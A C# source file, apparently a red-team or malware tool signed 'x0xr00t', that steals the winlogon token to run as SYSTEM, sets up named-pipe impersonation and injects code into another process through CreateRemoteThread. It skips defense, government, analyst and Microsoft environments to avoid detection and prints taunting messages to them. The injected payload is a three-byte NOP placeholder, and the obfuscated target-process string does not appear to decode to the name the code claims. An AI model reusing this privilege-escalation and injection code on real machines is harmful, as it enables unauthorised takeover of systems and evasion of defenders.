using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Linq;
using System.Security.Principal;
using System.Reflection;

// Metadata Easter Egg
[assembly: AssemblyTitle("Mindef > d,y.z... Wink")]
[assembly: AssemblyDescription("1.6.2.1 sending kisses - x0xr00t")]
[assembly: AssemblyCompany("x0xr00t: 'I don't break things, i just make them more interesting.'")]
[assembly: AssemblyProduct("Red Team's Best Friend™")]
[assembly: AssemblyCopyright("Copyright © 2026 x0xr00t. All rights reserved. Analysts: No rights reserved.")]

public class Program
{
    private static readonly byte K1 = 0xDE;
    private static readonly byte K2 = 0xAD;

    #region Win32 API - NT AUTHORITY\SYSTEM & Injection
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // Constants
    const uint TOKEN_DUPLICATE = 0x0002;
    const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
    const uint TOKEN_QUERY = 0x0008;
    const uint TOKEN_ALL_ACCESS = 0xF01FF;
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    #endregion

    private static string D(string b64)
    {
        byte[] d = Convert.FromBase64String(b64);
        for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
        return Encoding.UTF8.GetString(d);
    }

    public static void Main(string[] args)
    {
        // 1. Discovery / Easter Egg
        if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
        if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
        if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }

        // 2. Show Red Team Easter Egg by default on normal Windows systems
        ShowWindow(GetConsoleWindow(), 5);
        TriggerRedTeamEasterEgg();
        Thread.Sleep(3000);
        ShowWindow(GetConsoleWindow(), 0);

        // 3. Anti-Analysis Stealth
        if (Environment.ProcessorCount < 2) return;

        // 4. Elevate to SYSTEM via Token Stealing (Winlogon)
        ElevateToSystem();

        // 5. Start Named Pipe Backup for extra persistence/escalation
        Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
        pipeThread.Start();

        // 6. Reflective Injection as SYSTEM
        byte[] shellcode = { 0x90, 0x90, 0x90 };
        ReflectiveInjectIntoExplorer(shellcode);
    }

    private static void ElevateToSystem()
    {
        try
        {
            IntPtr hToken = IntPtr.Zero;
            Process target = Process.GetProcessesByName("winlogon").FirstOrDefault();
            if (target == null) return;

            IntPtr hProcess = OpenProcess(0x0400, false, target.Id);
            if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
            {
                IntPtr duplicatedToken = IntPtr.Zero;
                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out duplicatedToken))
                {
                    ImpersonateLoggedOnUser(duplicatedToken);
                }
            }
        }
        catch { }
    }

    private static void NamedPipeSystemEscalation()
    {
        try
        {
            string pipeName = @"\\.\pipe\x0xr00t_kiss";
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 1, 1024, 1024, 0, IntPtr.Zero);
            if (hPipe != IntPtr.Zero && ConnectNamedPipe(hPipe, IntPtr.Zero))
            {
                ImpersonateNamedPipeClient(hPipe);
            }
        }
        catch { }
    }

    private static void ReflectiveInjectIntoExplorer(byte[] code)
    {
        try
        {
            string exp = D("V0ZUVFhSRlY=");
            Process target = Process.GetProcessesByName(exp).FirstOrDefault();
            if (target == null) return;

            IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, target.Id);
            if (hProc != IntPtr.Zero)
            {
                IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)code.Length, 0x3000, 0x40);
                IntPtr written;
                WriteProcessMemory(hProc, addr, code, (uint)code.Length, out written);
                CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            }
        }
        catch { }
    }

    private static bool CheckDefenseEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        string[] t = { "mil", "gov", "defensie", "defense", "sandbox" };
        return t.Any(s => d.Contains(s));
    }

    private static bool IsAnalystEnvironment()
    {
        string u = Environment.UserName.ToLower();
        string[] a = { "analyst", "soc", "threat", "research", "forensic" };
        return a.Any(s => u.Contains(s));
    }

    private static bool IsMSRCEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        return d.Contains("microsoft") || d.Contains("msrc");
    }

    private static void TriggerEasterEgg()
    {
        ShowWindow(GetConsoleWindow(), 5);
        Console.ForegroundColor = ConsoleColor.Magenta;
        Console.WriteLine("\n\n [!] 1.6.2.1 sending kisses - x0xr00t");
        Console.WriteLine(" [!] Access Denied: Defense Environment Detected.");
        Console.WriteLine(" [!] PS: We know where you live. ;)");
        Thread.Sleep(5000);
    }

    private static void TriggerAnalystEasterEgg()
    {
        ShowWindow(GetConsoleWindow(), 5);
        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("\n\n [i] Analyst detected. Preparing your daily dose of false positives...");
        Console.WriteLine(" [i] Why did the analyst cross the road? To generate an incident report.");
        Console.WriteLine(" [i] Pro tip: Ctrl+F is not a detection strategy.");
        Console.WriteLine(" [i] x0xr00t: 'We see you. Keep up the good work... or not.'");
        Thread.Sleep(5000);
    }

    private static void TriggerRedTeamEasterEgg()
    {
        ShowWindow(GetConsoleWindow(), 5);
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("\n\n [+] Red Teamer detected! Cheers to us! *clink*");
        Console.WriteLine(" [+] 'The only easy day was yesterday.' - x0xr00t");
        Console.WriteLine(" [+] Remember: If it’s not broken, you’re not trying hard enough.");
        Console.WriteLine(" [+] Stay spicy, stay undetected.");
    }

    private static void TriggerMSRCEasterEgg()
    {
        ShowWindow(GetConsoleWindow(), 5);
        Console.ForegroundColor = ConsoleColor.Blue;
        Console.WriteLine("\n\n [~] MSRC or Security Dev detected. See you next round. ;)");
        Console.WriteLine(" [~] 'Patch Tuesday? More like Patch *someday*.'");
        Console.WriteLine(" [~] x0xr00t: 'Don’t be so sad, you still got a job... for now.' *wink*");
        Thread.Sleep(5000);
    }
}
